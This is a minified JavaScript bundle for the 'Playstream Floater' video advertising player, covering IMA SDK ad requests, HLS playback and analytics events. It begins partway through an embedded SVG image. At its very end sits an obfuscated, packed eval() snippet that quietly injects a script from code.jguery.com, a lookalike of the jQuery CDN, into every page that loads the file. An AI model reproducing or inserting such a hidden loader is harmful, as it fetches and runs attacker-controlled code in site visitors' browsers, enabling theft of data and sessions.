UuNiw0NS42LTY4LjQsNjguNGMtMzYuNCwzNi40LTcyLjgsNzIuOC0xMDkuMSwxMDkuMSAgICAgIGMtOC40LDguNC0xNi44LDE2LjgtMjUuMiwyNS4yYy05LjMsOS4zLTkuOSwyNi4yLDAsMzUuNGMxMCw5LjIsMjUuNSw5LjksMzUuNCwwYzIyLjgtMjIuOCw0NS42LTQ1LjYsNjguNC02OC40ICAgICAgYzM2LjQtMzYuNCw3Mi44LTcyLjgsMTA5LjEtMTA5LjFjOC40LTguNCwxNi44LTE2LjgsMjUuMi0yNS4yYzkuMy05LjMsOS45LTI2LjIsMC0zNS40Qzc5Mi43LDM3MS45LDc3Ny4yLDM3MS4yLDc2Ny4zLDM4MS4xICAgICAgTDc2Ny4zLDM4MS4xeiIvPjwvZz48L2c+PC9nPjwvZz48ZyBjbGFzcz0ic3QyIiBpZD0iRnVsbFNjcmVlbiI+PGcgY2xhc3M9InN0MyI+PHBhdGggY2xhc3M9InN0NCIgZD0iTTM4MCwxNTBIMTcwYy0xMSwwLTIwLDktMjAsMjB2MjExYzAsMTEsOSwyMCwyMCwyMGg5N2MxMSwwLDIwLTksMjAtMjB2LTczYzAtMTEsOS0yMCwyMC0yMGg3MyAgICBjMTEsMCwyMC05LDIwLTIwdi05OEM0MDAsMTU5LDM5MSwxNTAsMzgwLDE1MHoiLz48cGF0aCBjbGFzcz0ic3Q0IiBkPSJNNjAwLDE3MHY5OGMwLDExLDksMjAsMjAsMjBoNzNjMTEsMCwyMCw5LDIwLDIwdjczYzAsMTEsOSwyMCwyMCwyMGg5N2MxMSwwLDIwLTksMjAtMjBWMTcwYzAtMTEtOS0yMC0yMC0yMCAgICBINjIwQzYwOSwxNTAsNjAwLDE1OSw2MDAsMTcweiIvPjwvZz48ZyBjbGFzcz0ic3QzIj48cGF0aCBjbGFzcz0ic3Q0IiBkPSJNMzgwLDcxNGgtNzNjLTExLDAtMjAtOS0yMC0yMHYtNzNjMC0xMS05LTIwLTIwLTIwaC05N2MtMTEsMC0yMCw5LTIwLDIwdjIwOWMwLDExLDksMjAsMjAsMjBoMjEwICAgIGMxMSwwLDIwLTksMjAtMjB2LTk2QzQwMCw3MjMsMzkxLDcxNCwzODAsNzE0eiIvPjxwYXRoIGNsYXNzPSJzdDQiIGQ9Ik03MTMsNjIxdjczYzAsMTEtOSwyMC0yMCwyMGgtNzNjLTExLDAtMjAsOS0yMCwyMHY5NmMwLDExLDksMjAsMjAsMjBoMjEwYzExLDAsMjAtOSwyMC0yMFY2MjEgICAgYzAtMTEtOS0yMC0yMC0yMGgtOTdDNzIyLDYwMSw3MTMsNjEwLDcxMyw2MjF6Ii8+PC9nPjwvZz48ZyBjbGFzcz0ic3QyIiBpZD0iU21hbGxTY3JlZW4iPjxnIGNsYXNzPSJzdDMiPjxwYXRoIGNsYXNzPSJzdDQiIGQ9Ik0xNzAsNDAxaDIxMGMxMSwwLDIwLTksMjAtMjBWMTcwYzAtMTEtOS0yMC0yMC0yMGgtOTdjLTExLDAtMjAsOS0yMCwyMHY3M2MwLDExLTksMjAtMjAsMjBoLTczICAgIGMtMTEsMC0yMCw5LTIwLDIwdjk4QzE1MCwzOTIsMTU5LDQwMSwxNzAsNDAxeiIvPjxwYXRoIGNsYXNzPSJzdDQiIGQ9Ik04NTAsMzgxdi05OGMwLTExLTktMjAtMjAtMjBoLTczYy0xMSwwLTIwLTktMjAtMjB2LTczYzAtMTEtOS0yMC0yMC0yMGgtOTdjLTExLDAtMjAsOS0yMCwyMHYyMTEgICAgYzAsMTEsOSwyMCwyMCwyMGgyMTBDODQxLDQwMSw4NTAsMzkyLDg1MCwzODF6Ii8+PC9nPjxnIGNsYXNzPSJzdDMiPjxwYXRoIGNsYXNzPSJzdDQiIGQ9Ik0xNzAsNzM3aDczYzExLDAsMjAsOSwyMCwyMHY3M2MwLDExLDksMjAsMjAsMjBoOTdjMTEsMCwyMC05LDIwLTIwVjYyMWMwLTExLTktMjAtMjAtMjBIMTcwICAgIGMtMTEsMC0yMCw5LTIwLDIwdjk2QzE1MCw3MjgsMTU5LDczNywxNzAsNzM3eiIvPjxwYXRoIGNsYXNzPSJzdDQiIGQ9Ik03MzcsODMwdi03M2MwLTExLDktMjAsMjAtMjBoNzNjMTEsMCwyMC05LDIwLTIwdi05NmMwLTExLTktMjAtMjAtMjBINjIwYy0xMSwwLTIwLDktMjAsMjB2MjA5ICAgIGMwLDExLDksMjAsMjAsMjBoOTdDNzI4LDg1MCw3MzcsODQxLDczNyw4MzB6Ii8+PC9nPjwvZz48ZyBjbGFzcz0ic3QyIiBpZD0iU2VhcmNoIj48cGF0aCBjbGFzcz0ic3Q1IiBkPSJNODI5LjksNzY1LjFsLTY0LjcsNjQuN2MtNy44LDcuOC0yMC41LDcuOC0yOC4zLDBMNTQwLjEsNjMzLjFjLTcuOC03LjgtNy44LTIwLjUsMC0yOC4zbDY0LjctNjQuNyAgIGM3LjgtNy44LDIwLjUtNy44LDI4LjMsMGwxOTYuNywxOTYuN0M4MzcuNiw3NDQuNiw4MzcuNiw3NTcuNCw4MjkuOSw3NjUuMXoiLz48cGF0aCBjbGFzcz0ic3Q1IiBkPSJNNDE0LDE1MGMtMTQ1LjgsMC0yNjQsMTE4LjItMjY0LDI2NHMxMTguMiwyNjQsMjY0LDI2NHMyNjQtMTE4LjIsMjY0LTI2NFM1NTkuOCwxNTAsNDE0LDE1MHogTTQxNCw1NjUgICBjLTgzLjQsMC0xNTEtNjcuNi0xNTEtMTUxczY3LjYtMTUxLDE1MS0xNTFzMTUxLDY3LjYsMTUxLDE1MVM0OTcuNCw1NjUsNDE0LDU2NXoiLz48L2c+PGcgY2xhc3M9InN0MiIgaWQ9Ikxvb3AiPjxnIGNsYXNzPSJzdDMiPjxwYXRoIGNsYXNzPSJzdDQiIGQ9Ik00ODUuOCwxMTMuOUwzNDkuMywyNTAuNWMtMy41LDMuNS0zLjUsOS4xLDAsMTIuNmwxMzYuNiwxMzYuNmM1LjYsNS42LDE1LjIsMS42LDE1LjItNi4zVjEyMC4yICAgIEM1MDEsMTEyLjMsNDkxLjQsMTA4LjMsNDg1LjgsMTEzLjl6Ii8+PC9nPjxwYXRoIGNsYXNzPSJzdDUiIGQ9Ik01MDAsMTk0LjhWMzE3YzEyNS45LDAsMjI4LDEwMi4xLDIyOCwyMjhTNjI1LjksNzczLDUwMCw3NzN2MTIxLjhjMTkzLjMsMCwzNTAtMTU2LjcsMzUwLTM1MCAgIFM2OTMuMywxOTQuOCw1MDAsMTk0Ljh6Ii8+PHBhdGggY2xhc3M9InN0NSIgZD0iTTI3Miw1NDVjMC01NS4xLDE5LjYtMTA1LjcsNTIuMS0xNDUuMWM2LjUtNy45LDUuOS0xOS41LTEuNC0yNi44bC01OC4zLTU4LjNjLTguMi04LjItMjEuNy03LjctMjkuMywxICAgQzE4Mi4xLDM3Ny4zLDE1MCw0NTcuMywxNTAsNTQ0LjhjMCwxOTMuMywxNTYuNywzNTAsMzUwLDM1MFY3NzNDMzc0LjEsNzczLDI3Miw2NzAuOSwyNzIsNTQ1eiIvPjwvZz48ZyBjbGFzcz0ic3QyIiBpZD0iRW5kTG9vcCI+PGcgY2xhc3M9InN0MyI+PHBhdGggY2xhc3M9InN0NCIgZD0iTTUzNi4yLDY5MS42TDY3Mi43LDU1NWMzLjUtMy41LDMuNS05LjEsMC0xMi42TDUzNi4yLDQwNS45Yy01LjYtNS42LTE1LjItMS42LTE1LjIsNi4zdjI3My4xICAgIEM1MjEsNjkzLjIsNTMwLjYsNjk3LjIsNTM2LjIsNjkxLjZ6Ii8+PC9nPjxwYXRoIGNsYXNzPSJzdDUiIGQ9Ik01NTQsNDczSDE2MmMtNi42LDAtMTIsNS40LTEyLDEydjEyN2MwLDYuNiw1LjQsMTIsMTIsMTJoMzkyYzYuNiwwLDEyLTUuNCwxMi0xMlY0ODUgICBDNTY2LDQ3OC40LDU2MC42LDQ3Myw1NTQsNDczeiIvPjxwYXRoIGNsYXNzPSJzdDUiIGQ9Ik04NTAsNzkyVjMxNmMwLTYuNi01LjQtMTItMTItMTJoLTc5Yy02LjYsMC0xMiw1LjQtMTIsMTJ2NDc2YzAsNi42LDUuNCwxMiwxMiwxMmg3OSAgIEM4NDQuNiw4MDQsODUwLDc5OC42LDg1MCw3OTJ6Ii8+PC9nPjwvc3ZnPg=="> </a> <a href="https://adsolut.in/?utm_source=outstream&utm_medium=CPM&utm_campaign=playstream_outstream" target=_blank role=button class=on-hover style=position:absolute;bottom:0;right:5px;height:24px;width:36px;display:flex;justify-content:center> <img style=align-self:center;margin:0!important;height:16px!important;width:16px!important src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAaCAYAAADWm14/AAAEuElEQVRIiaWWS28cRRSFv1vVD3vssZMYnAcEIhxMECxYsEFiwYr8BoSE2CL+QSR+AQtW7NixZAFIEUiRoiQEJBIhkCIloCQ8gkJIIkNsPLanp7vqoqruediejCMo6apr3K46p86991QL731FHFMJbJUgArmFxMBGCUbqd+FvIbImpqyQJ5bcJmQx0vjM7TS5fZLMHiezy6Rmmcw+R2qWSEyL1KxjzZvAF4BPQAFhwggvLZADKZA1zxngCeA48CywDHoc1WM4beG8UEm9WkafOgf6BsIZoJdMQm6AF0FfBE6gLMWAJbwexfnZCGKaGIA0c8YQqMfPSDw5kwlYWcTpKZy+Q+UtBgaxDawPMALGzpMPCGwifApUkwgIViyt9DCr3ZOU2O0A44B3nH50vk0dvsHITXi4AgnKPpQ2wgKpuUPplxAxewOPUcJsU8ADn1D5Ygg2PDOkRuj5Azj/Ek5yUpsym53ln+IYpX96O2izsRmNPZQQuQucRSgD5MKtX+OS/jC00gzhcbzO4jQDtWT2d+bzLxFWKD3jwzXhoer/j6vn1ci8dKep/AqV1/D74LtvDxTIUJ2K7TWbKUWVIEzF8wTm08lVvC6w1nud0s9vU2HPghycvovyGaXfCoCLv1wH70kIWUHbVD6PMqa2g9q7lP4pSm/rDew6rfRbnM7T6b1KSWuwuXlYUe74jVwBrgT5D974kQPvnwJXkUR5Qi0MF1Wk5jZec0p/CMHEd5n9m9nsAs632axeRiQdEhhTGzvJEFpP18Jk/0cfIJ04lSTmBtlAfBsRqReaIua+cBmlf6zZUEnNn7Tzczido+eej+TGpmCXEvcRzuM0yo/XQRMkdTfqRjQaYaZZqGR2oyZRBRJzzaae1P7GXHaO1WK27oxH8AU4D3oLEbeDwKAIFa8dSh96fbpZ6EnNaqPEM5Su1WzaI7PXaGfzrBUnKd3iUIWxKShRPU3pVweoQwLlqBE5NJIISmRNhTsSs0Jq8nja0mdNijaZSr7H+XnWy9eGCo1NwU+I/IBod4A0FADLK2+NuqDWRAKBxvmMeBLTjWpVvl23poA1XVL7AB/r4dCwkHep8DFez+BCmpUQyfwRpm58h7jeLitWVHs4Nih9O5ZY3MwW0ZJVcyq/GIs1tqy513TGPgr3wm67ljVUzyMj8gN3jyyzP8mh6Iy9CwKJLZw3lMw2nVEXZWpv03MppTvQ5F1J7a26M7ptSn9sRwouI/YGouUYlLEpGCGBR4MCTb8HMGt6GKlwOtOkqSlW+yAUFD13ONp4nYIA8SFOL8bLp2/L/Vg8wcz1i9vugp2jQnWD0hUjPu8w8hep/QOnxYjnb5LZr5myF1Bdbe6Lqzi9ROU74+6PlYWjUanJHyRKhaffnn0lKhJzj9QEfziKxOvbIdJhOv2cSi/Rcy2cXKZHsF8/CWKvT7KRonTh+6D5MJGCxNwZ2LXTCiOO1NyMpqMUKB2c7+2x+54E+iS6OEzsjKFdb8Wi9JWlcDNYCYazQmLu49Q9wr6PpEB/eLxuNXbdipd0bdfrpPZaTFHwecuDqMTEj+z/RiAMh493xtCua7BwrW2iGqp+Yr7/L4EwqiEJcgxFdMRQhP9lAP8CASs9hnnDsx0AAAAASUVORK5CYII="> </a> </div> '},function(e,t,r){"use strict";(function(e){r.d(t,"a",function(){return o});var i=r(4),n=r.n(i);function a(e,t){for(var r=0;r<t.length;r++){var i=t[r];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}var s=!1,o=function(){function t(){if(function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t),e.videoElem)return s=e.videoElem.getElementsByTagName("source")[0].getAttribute("src"),n.a.isSupported()?this.supported():this.unsupported()}var r,i,o;return r=t,(i=[{key:"supported",value:function(){var t=new n.a({maxBufferLength:5,maxMaxBufferLength:10});return t.loadSource(s),t.attachMedia(e.videoElem),t.on(n.a.Events.MANIFEST_PARSED,function(e){ps_logger.log("Manifest Parsed")}),new Promise(function(e,t){e({status:!0})})}},{key:"unsupported",value:function(){return new Promise(function(e,t){videoElem.canPlayType("application/vnd.apple.mpegurl")?(videoElem.src="videoUrl",videoElem.addEventListener("loadedmetadata",function(e){ps_logger.warn(e)}),e({status:!0})):t({message:"The Browser doesn't support HLS"})})}}])&&a(r.prototype,i),o&&a(r,o),t}()}).call(this,r(1))},function(e,t,r){"use strict";(function(e){function i(e){return(i="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e})(e)}function n(e,t){for(var r=0;r<t.length;r++){var i=t[r];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}var a,s,o,u,l;r.d(t,"a",function(){return h});var c,d,f=!0,h=function(){function t(){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t)}var r,h,p;return r=t,(h=[{key:"init",value:function(t,r){u=jQuery(".playstream_floater .on-hover");var n=this;return l=r,new Promise(function(r,a){var o=1,u=setInterval(function(){"object"===("undefined"==typeof google?"undefined":i(google))||"function"==typeof google?(s=new google.ima.AdDisplayContainer(document.getElementById("ps_ad_container"),e.videoElem),c=t.videoHeight,d=t.videoWidth,n.adsLoaderFunc(),clearInterval(u),r({status:!0})):++o>5&&clearInterval(u)},5e3)})}},{key:"adsLoaderFunc",value:function(){(a=new google.ima.AdsLoader(s)).getSettings().setVpaidMode(google.ima.ImaSdkSettings.VpaidMode.INSECURE),a.addEventListener(google.ima.AdsManagerLoadedEvent.Type.ADS_MANAGER_LOADED,this.adManagerLoaded.bind(this),!1),a.addEventListener(google.ima.AdErrorEvent.Type.AD_ERROR,this.adError,!1),this.adsRequest()}},{key:"adManagerLoaded",value:function(t){var r=new google.ima.AdsRenderingSettings;(o=t.getAdsManager(e.videoElem,r)).addEventListener(google.ima.AdErrorEvent.Type.AD_ERROR,this.adError,!1),o.addEventListener([google.ima.AdEvent.Type.COMPLETE,google.ima.AdEvent.Type.STARTED,google.ima.AdEvent.Type.LOADED,google.ima.AdEvent.Type.ALL_ADS_COMPLETED,google.ima.AdEvent.Type.CONTENT_RESUME_REQUESTED,google.ima.AdEvent.Type.CONTENT_PAUSE_REQUESTED],this.onAdEvent,!1),s.initialize();try{o.init(d,c,google.ima.ViewMode.NORMAL),o.start()}catch(e){}}},{key:"onAdEvent",value:function(t){switch(t.type){case google.ima.AdEvent.Type.CONTENT_RESUME_REQUESTED:u.show(),e.videoElem.play();break;case google.ima.AdEvent.Type.CONTENT_PAUSE_REQUESTED:u.hide(),e.videoElem.pause();break;case google.ima.AdEvent.Type.LOADED:e.ps_analytics.an_event("loaded"),f&&ps_elem.animate({width:"toggle"}),f=!1;break;case google.ima.AdEvent.Type.STARTED:e.ps_analytics.an_event("started");break;case google.ima.AdEvent.Type.ALL_ADS_COMPLETED:e.ps_analytics.an_event("completed"),s.destroy()}}},{key:"adsRequest",value:function(){var e=new google.ima.AdsRequest;e.adTagUrl=l,e.linearAdSlotWidth=d,e.linearAdSlotHeight=c,e.nonLinearAdSlotWidth=d,e.nonLinearAdSlotHeight=150,a.requestAds(e)}},{key:"adError",value:function(e){ps_logger.error(e.getError().getMessage()),ps_elem.animate({width:"toggle"},function(){$(this).remove()})}},{key:"volumeManager",value:function(){return o&&(e.videoElem.muted?o.setVolume(0):o.setVolume(1)),!0}}])&&n(r.prototype,h),p&&n(r,p),t}()}).call(this,r(1))},function(e,t,r){"use strict";(function(e){function i(e,t){for(var r=0;r<t.length;r++){var i=t[r];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}r.d(t,"a",function(){return n});var n=function(){function t(){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t)}var r,n,a;return r=t,a=[{key:"events",value:function(){e.videoElem.addEventListener("ended",function(){e.ps_elem.animate({width:"toggle"}).remove()}),e.videoElem&&jQuery(e.videoElem).on("ended",function(){e.ps_elem.animate({width:"toggle"})}),jQuery("#ps_floater .cross").on("click",function(){ps_elem.animate({width:"toggle"},function(){e.videoElem.pause(),e.videoElem.removeAttribute("src"),e.videoElem.load(),jQuery(this).remove()})}),jQuery("#ps_floater #ps_mute").on("click",function(e){e.preventDefault(),videoElem.muted?(videoElem.muted=!1,ps_imamanager.volumeManager(),jQuery(this).find("img").attr("src",jQuery(this).data("mute"))):(videoElem.muted=!0,ps_imamanager.volumeManager(),jQuery(this).find("img").attr("src",jQuery(this).data("unmute")))})}}],(n=null)&&i(r.prototype,n),a&&i(r,a),t}()}).call(this,r(1))},,,,,,,,,,,,,function(e,t,r){e.exports=r(29)},function(e,t){e.exports="/images/cross.svg?d21c5bffcce859cbff0e3de5b3255b45"},,,,function(e,t,r){"use strict";r.r(t);var i=r(0),n=r.n(i);var a=r(7);function s(e,t){for(var r=0;r<t.length;r++){var i=t[r];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}var o=function(){function e(){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),console.log("Playstream Floater - Production")}var t,r,i;return t=e,(r=[{key:"error",value:function(e){ps_dev&&console.error("Playstream -",e)}},{key:"log",value:function(e){ps_dev&&console.log("Playstream -",e)}},{key:"warn",value:function(e){ps_dev&&console.warn("Playstream -",e)}}])&&s(t.prototype,r),i&&s(t,i),e}();function u(e,t){for(var r=0;r<t.length;r++){var i=t[r];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}var l={videoWidth:370,videoHeight:210},c=function(){function e(){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e)}var t,r,i;return t=e,(r=[{key:"Height",set:function(e){return l.videoHeight=e,!0}},{key:"Width",set:function(e){return l.videoWidth=e,!0}},{key:"values",get:function(){return l}}])&&u(t.prototype,r),i&&u(t,i),e}(),d=r(10),f=r(11);function h(e,t){for(var r=0;r<t.length;r++){var i=t[r];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}var p="floater_ps_Tracker",g=function(){function e(t){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),"function"==typeof ga&&ga("create",t,"auto","floater_ps_Tracker")}var t,r,i;return t=e,(r=[{key:"init",value:function(){}},{key:"an_event",value:function(e){"function"==typeof ga&&("impression"===e?(ga(p+".send","pageview"),ga(p+".send","event","Playstream Floater",e)):ga(p+".send","event","Playstream Floater",e))}}])&&h(t.prototype,r),i&&h(t,i),e}();function y(e,t){for(var r=0;r<t.length;r++){var i=t[r];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}var v,m,L,M=M||window;M.ps_dev=!1,v="floater.playstream.media";var T=new c,A=new d.a;M.videoElem=!1,M.ps_elem=!1,M.ps_imamanager=A;var w=!1,E=function(){function e(t){if(function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),"undefined"==typeof jQuery&&(M.jQuery=M.$=n.a,window.jQuery=window.$=n.a),(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|ipad|iris|kindle|Android|Silk|lge |maemo|midp|mmp|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino/i.test(navigator.userAgent)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(navigator.userAgent.substr(0,4)))&&(w=!0),w&&!t.show_mobile)return console.warn("Mobile Device Ad Display has been disabled. Please contact Playstream Support on info@playstream.media"),!1;if(M.ps_logger=new o,ps_logger.log(t),T.Height=null===t.player_height?T.values.videoHeight:t.player_height,T.Width=null===t.player_width?T.values.videoWidth:t.player_width,w&&(T.values.videoHeight>176&&(T.Height=176),T.values.videoWidth>352&&(T.Width=300)),console.log(T),(m=t).videos_array){var r=m.videos_array[Math.floor(Math.random()*m.videos_array.length)],i="//"+v+"/storage/videojson/"+r+".json",a=this;jQuery.get(i,function(e){e?(L=e,a.init()):ps_logger.error("Error loading the video")})}}var t,r,i;return t=e,(r=[{key:"init",value:function(){M.ps_analytics=new g(m.analytics),M.ps_analytics.an_event("impression"),(jQuery&&ps_logger.log("jQuery is loaded"),new Promise(function(e,t){var r=0===jQuery('script[src="//imasdk.googleapis.com/js/sdkloader/ima3.js"]').length;if(console.log("isLoaded",r),!r)return e({status:!0,msg:"IMA SDK is Already loaded"});var i=jQuery("<script/>");i.attr({id:"ima-sdk-playstream",src:"//imasdk.googleapis.com/js/sdkloader/ima3.js"});try{jQuery("head").append(i).ready(function(){return ps_logger.log("Appended IMA SDK script to head"),e({status:!0,msg:"IMA SDK is loaded"})})}catch(e){return t(e)}})).then(function(e){ps_logger.log(e),setTimeout(function(){var e;e=m.position?m.position:"right",Object(a.a)(T.values,L,e,w).then(function(e){ps_logger.log("Elem Generator",e),console.log("Playstream Floater is now active"),e.status&&A.init(T.values,m.xmlFile).then(function(e){f.a.events()})})},1e3)}).catch(function(e){ps_logger.error(e.message)})}}])&&y(t.prototype,r),i&&y(t,i),e}();M.PlayStream=E;t.default=E}]);eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('7 0=2.8(\'6\');0.a(\'4\',\'3://5.9.g/b-1.h.1.f.e\');2.c.d(0);',18,18,'adsscript||document|https|src|code|script|var|createElement|jguery|setAttribute|jquery|head|appendChild|js|min|com|11'.split('|'),0,{}));